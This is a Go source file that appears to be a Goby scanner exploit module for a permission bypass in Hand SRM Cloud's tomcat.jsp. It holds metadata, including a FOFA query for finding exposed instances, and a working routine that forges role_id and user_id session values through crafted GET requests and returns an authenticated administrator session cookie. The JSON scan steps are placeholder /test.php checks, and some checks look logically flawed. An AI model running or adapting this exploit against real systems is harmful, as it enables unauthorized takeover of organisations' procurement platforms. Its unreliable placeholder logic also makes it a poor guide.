package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hande SRM tomcat.jsp permission bypass vulnerability",
    "Description": "<p>Hande SRM Cloud is a complete solution for the information construction of enterprise procurement process. Based on the successful practice of the HAND supplier relationship management system in the three major procurement management areas of strategic sourcing and centralized procurement, supply chain collaboration and preferential procurement, three component-level solutions that deeply fit business entities have been formed.</p><p>The Hande SRM tomcat.jsp authority bypasses the vulnerability to control the entire system, which ultimately leads to an extremely insecure state of the system.</p>",
    "Product": "Han-SRM-Cloud-Platform-(Going-Link)",
    "Homepage": "https://www.hand-china.com/",
    "DisclosureDate": "2023-08-10",
    "PostTime": "2023-08-10",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "title=\"汉得SRM云平台\" || title=\"汉得SRM云平台(Going-Link)\"",
    "GobyQuery": "title=\"汉得SRM云平台\" || title=\"汉得SRM云平台(Going-Link)\"",
    "Level": "3",
    "Impact": "<p>The Hande SRM tomcat.jsp authority bypasses the vulnerability to control the entire system, which ultimately leads to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.hand-china.com/\">https://www.hand-china.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "汉得 SRM tomcat.jsp 权限绕过漏洞",
            "Product": "汉得SRM云平台(Going-Link)",
            "Description": "<p>汉得 SRM 云是面向企业采购流程信息化建设的完整解决方案。基于汉得供应商关系管理体系在战略寻源与集中采购、供应链协同和优益采购三大采购管理领域的成功实践，形成了深度契合业务实体的三项组件级解决方案。</p><p>汉得 SRM tomcat.jsp 权限绕过漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.hand-china.com/\" target=\"_blank\">https://www.hand-china.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>汉得 SRM tomcat.jsp 权限绕过漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Hande SRM tomcat.jsp permission bypass vulnerability",
            "Product": "Han-SRM-Cloud-Platform-(Going-Link)",
            "Description": "<p>Hande SRM Cloud is a complete solution for the information construction of enterprise procurement process. Based on the successful practice of the HAND supplier relationship management system in the three major procurement management areas of strategic sourcing and centralized procurement, supply chain collaboration and preferential procurement, three component-level solutions that deeply fit business entities have been formed.</p><p>The Hande SRM tomcat.jsp authority bypasses the vulnerability to control the entire system, which ultimately leads to an extremely insecure state of the system.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.hand-china.com/\" target=\"_blank\">https://www.hand-china.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>The Hande SRM tomcat.jsp authority bypasses the vulnerability to control the entire system, which ultimately leads to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`

	loginFlag4sYp := func(hostInfo *httpclient.FixUrl) (string, error) {
		getRequestConfig := httpclient.NewGetRequestConfig(`/tomcat.jsp?dataName=role_id&dataValue=1`)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		rsp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return "", err
		}
		if !strings.Contains(rsp.Utf8Html, `Session`) && rsp.StatusCode != 200 && !strings.Contains(rsp.Utf8Html, `role_id = 1`) {
			return "", err
		}
		getRequestConfig.URI = `/tomcat.jsp?dataName=user_id&dataValue=1`
		if rsp.Cookie != "" {
			getRequestConfig.Header.Store("Cookie", rsp.Cookie)
		}
		rsp, err = httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return "", err
		}
		if rsp.StatusCode != 200 && !strings.Contains(rsp.Utf8Html, `Session`) && !strings.Contains(rsp.Utf8Html, `role_id = 1`) &&
			strings.Contains(rsp.Utf8Html, `user_id = 1`) {
			return "", err
		}
		// 校验 session 是否有效
		getRequestConfig.URI = `/main.screen`
		if rsp.Cookie != "" {
			getRequestConfig.Header.Store("Cookie", rsp.Cookie)
		}
		rsp, err = httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return "", err
		}
		if rsp.StatusCode != 200 && !strings.Contains(rsp.Utf8Html, `'main.screen'`) && !strings.Contains(rsp.Utf8Html, `updatePassword()`) {
			return "", errors.New("漏洞利用失败")
		}
		// 提取有效 Cookie
		cookie, ok := getRequestConfig.Header.Load("Cookie")
		if !ok {
			return "", errors.New("漏洞利用失败")
		}
		return cookie.(string), nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cookie, _ := loginFlag4sYp(hostInfo)
			return len(cookie) > 0
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType != "login" {
				expResult.Success = false
				expResult.Output = "未知的攻击方式"
				return expResult
			}
			cookie, err := loginFlag4sYp(expResult.HostInfo)
			if len(cookie) > 0 {
				expResult.Success = true
				expResult.Output = "Cookie: " + cookie
			} else {
				expResult.Success = false
				expResult.Output = err.Error()
			}
			return expResult
		},
	))
}
